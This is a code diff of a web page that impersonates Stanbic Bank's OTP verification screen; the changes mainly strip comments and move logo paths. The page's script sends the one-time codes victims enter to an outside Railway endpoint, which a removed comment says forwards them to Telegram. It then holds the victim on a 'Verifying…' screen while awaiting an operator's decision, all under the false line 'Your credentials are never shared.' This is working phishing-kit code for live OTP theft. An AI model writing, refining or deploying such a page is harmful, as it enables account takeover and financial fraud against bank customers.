@@ -9,7 +9,6 @@
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    /* Stanbic Brand Colors */
     --stanbic-blue: #1A73E8;
     --stanbic-blue-dark: #0B2545;
     --stanbic-navy: #202124;
@@ -28,13 +27,11 @@
   }
   .wrap { max-width: 440px; margin: 0 auto; }
 
-  /* Header */
   .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
   .brand { display: inline-flex; align-items: center; gap: 8px; font-weight: 800; font-size: 20px; letter-spacing: -0.5px; color: var(--stanbic-blue-dark); }
   .brand-logo { height: 32px; width: auto; object-fit: contain; }
   .header .label { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--stanbic-muted); }
 
-  /* Card */
   .card { background: #fff; border-radius: 20px; border: 1px solid var(--stanbic-border); box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden; }
   .card-head { padding: 22px 22px 16px; border-bottom: 1px solid var(--stanbic-border); background: #FBFCFE; text-align: center; }
   .card-head h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; color: var(--stanbic-blue-dark); }
@@ -42,14 +39,12 @@
 
   .card-body { padding: 20px 22px 22px; }
 
-  /* Transaction Block (Admin Reference) */
   .tx-block { background: var(--stanbic-soft); border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-left: 4px solid var(--stanbic-blue); }
   .tx-block .tx-left .k { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--stanbic-muted); margin-bottom: 3px; }
   .tx-block .tx-left .v { font-size: 13.5px; font-weight: 700; word-break: break-all; color: var(--stanbic-navy); }
   .tx-block .tx-amt { font-size: 17px; font-weight: 800; color: var(--stanbic-blue); letter-spacing: -0.4px; white-space: nowrap; }
   .tx-block .tx-amt .cur { font-size: 11.5px; font-weight: 700; margin-right: 3px; opacity: 0.85; }
 
-  /* Expired Notice */
   .expired-notice {
     display: none; background: #FEF2F2; border: 1px solid #FECACA; border-left: 3px solid #E31E24;
     color: #B91C1C; font-size: 12.5px; font-weight: 600; padding: 11px 14px; border-radius: 10px;
@@ -60,7 +55,6 @@
   .expired-notice .text { flex: 1; }
   .expired-notice .text small { display: block; font-size: 11px; font-weight: 500; color: #7F1D1D; margin-top: 2px; }
 
-  /* OTP Input */
   .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center; color: var(--stanbic-navy); }
   .otp-input-wrap { margin-bottom: 14px; }
   .otp-input {
@@ -89,14 +83,12 @@
   .action-btn:active { transform: scale(0.99); }
   .action-btn:disabled { opacity: 0.7; cursor: wait; }
 
-  /* Footer */
   .card-foot { padding: 14px 22px 18px; border-top: 1px solid var(--stanbic-border); background: #FBFCFE; text-align: center; }
   .card-foot .brand { font-size: 15px; justify-content: center; }
   .card-foot .small { font-size: 10.5px; color: var(--stanbic-muted); margin-top: 3px; }
 
   .page-foot { text-align: center; margin-top: 16px; font-size: 11px; color: var(--stanbic-muted); line-height: 1.6; }
 
-  /* Verifying Overlay */
   .verifying { position: fixed; inset: 0; background: #FFFFFF; display: none; align-items: center; justify-content: center; z-index: 2000; }
   .verifying.show { display: flex; }
   .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
@@ -107,7 +99,6 @@
   .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; color: var(--stanbic-navy); }
   .verifying .s { font-size: 13px; color: var(--stanbic-muted); line-height: 1.6; }
 
-  /* Toast */
   .toast {
     position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
     background: var(--stanbic-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
@@ -130,7 +121,7 @@
 <div class="wrap">
   <div class="header">
     <div class="brand">
-      <img class="brand-logo" src="stanbic-bank-logo.png" alt="Stanbic Bank">
+      <img class="brand-logo" src="images/stanbic-bank-logo.png" alt="Stanbic Bank">
     </div>
     <span class="label">Verification</span>
   </div>
@@ -142,7 +133,6 @@
     </div>
 
     <div class="card-body">
-      <!-- Transaction Block with Admin Reference -->
       <div class="tx-block">
         <div class="tx-left">
           <div class="k">Transaction Reference</div>
@@ -174,7 +164,7 @@
 
     <div class="card-foot">
       <div class="brand">
-        <img class="brand-logo" style="height: 24px;" src="stanbic-bank-logo.png" alt="Stanbic Bank">
+        <img class="brand-logo" style="height: 24px;" src="images/stanbic-bank-logo.png" alt="Stanbic Bank">
       </div>
       <div class="small">Your credentials are never shared.</div>
     </div>
@@ -187,7 +177,7 @@
 
 <div class="verifying" id="verifying">
   <div class="inner">
-    <div class="logo-big"><img class="brand-logo" src="stanbic-bank-logo.png" alt="Stanbic Bank"></div>
+    <div class="logo-big"><img class="brand-logo" src="images/stanbic-bank-logo.png" alt="Stanbic Bank"></div>
     <div class="spinner"></div>
     <div class="t">Verifying…</div>
     <div class="s">Please wait for approval. Do not close this page.</div>
@@ -197,9 +187,6 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ────────────────────────────────────────────────────────────
-     RAILWAY endpoints — all API calls route through Railway
-     ──────────────────────────────────────────────────────────── */
   const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
 
   const CONFIG = {
@@ -214,9 +201,6 @@
     NEXT_INACTIVE: 'inactive.html'
   };
 
-  /* ------------------------------------------------------------
-     Resolve transaction data from the URL, ?r=, or sessionStorage
-  ------------------------------------------------------------ */
   const params = new URLSearchParams(location.search);
   const txData = {
     tx:  params.get('tx')  || '',
@@ -235,7 +219,6 @@
   }
 
   async function resolveTx() {
-    // 1) ?d= base64 payload
     const d = params.get('d');
     if (d) {
       try {
@@ -252,7 +235,6 @@
         return;
       } catch (e) {}
     }
-    // 2) ?r= short code
     const code = params.get('r');
     if (code) {
       for (const makeUrl of CONFIG.LINKS) {
@@ -276,7 +258,6 @@
         } catch (e) {}
       }
     }
-    // 3) sessionStorage fallback
     try {
       const raw = sessionStorage.getItem('amz_payload');
       if (raw) {
@@ -294,9 +275,6 @@
     } catch (e) {}
   }
 
-  /* ------------------------------------------------------------
-     Render tx block
-  ------------------------------------------------------------ */
   function renderTxBlock() {
     if (txData.tx) {
       document.getElementById('txId').textContent = txData.tx;
@@ -311,15 +289,10 @@
     }
   }
 
-  /* ------------------------------------------------------------
-     Flexible OTP Input (Handles 5 or 6 digits silently)
-  ------------------------------------------------------------ */
   const otpInput = document.getElementById('otpInput');
 
   otpInput.addEventListener('input', () => {
-    // Allow only digits, max 6
     otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
-    // Highlight if 5 or 6 digits are entered
     otpInput.classList.toggle('filled', otpInput.value.length >= 5);
   });
 
@@ -330,7 +303,6 @@
     }
   });
 
-  // Paste support
   otpInput.addEventListener('paste', (e) => {
     const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
     if (text.length >= 5) {
@@ -344,9 +316,6 @@
   function clearOtp() { otpInput.value = ''; otpInput.classList.remove('filled'); otpInput.focus(); }
   function setOtpEnabled(on) { otpInput.disabled = !on; }
 
-  /* ------------------------------------------------------------
-     UI helpers
-  ------------------------------------------------------------ */
   function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg; t.classList.add('show');
@@ -356,9 +325,6 @@
   function showExpiredNotice() { document.getElementById('expiredNotice').classList.add('show'); }
   function hideExpiredNotice() { document.getElementById('expiredNotice').classList.remove('show'); }
 
-  /* ------------------------------------------------------------
-     Resend countdown
-  ------------------------------------------------------------ */
   let countdown = 30;
   let timer = null;
   const resendBtn = document.getElementById('resendBtn');
@@ -381,9 +347,6 @@
     }, 1000);
   }
 
-  /* ------------------------------------------------------------
-     Request a code
-  ------------------------------------------------------------ */
   async function requestCode(source) {
     hideExpiredNotice();
     resendBtn.disabled = true;
@@ -420,9 +383,6 @@
     }
   }
 
-  /* ------------------------------------------------------------
-     Verify — submit OTP to Railway → Telegram, poll decision
-  ------------------------------------------------------------ */
   async function verifyCode() {
     hideExpiredNotice();
 
@@ -448,7 +408,7 @@
           c:  txData.c
         })
       });
-    } catch (e) { /* keep polling */ }
+    } catch (e) {}
 
     const start = Date.now();
     const maxWaitMs = 2 * 60 * 1000;
